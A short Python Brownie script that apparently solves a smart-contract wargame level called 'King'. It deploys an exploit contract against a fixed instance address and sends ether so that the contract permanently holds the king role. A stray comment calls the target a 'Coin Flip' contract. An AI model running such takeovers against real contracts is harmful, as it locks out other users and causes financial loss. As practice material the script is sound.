from brownie import interface, accounts, config, KingHack, web3
import pytest

INSTANCE_ADDRESS = "0x5a413BB696C5eBE1ab390924aCb3d94C4B5A91f5"
ACCOUNT = accounts.add(config["wallets"]["from_key"])

def hack():
    # grab the Coin Flip contract Object
    instance_contract = interface.IKing(INSTANCE_ADDRESS)
    # deploy the exploit contract

    exploit_contract = KingHack.deploy(INSTANCE_ADDRESS, {"from": ACCOUNT})
    print(exploit_contract.address)

    exploit_tx = exploit_contract.hack({"from": ACCOUNT, "value": "1 ether"})
    exploit_tx.wait(1)

    assert(instance_contract._king() == exploit_contract.address)

    print(f"Contract has been hacked. Now {instance_contract._king()} is the actual king. Nobody else can claim the throne")

def main():
    hack()


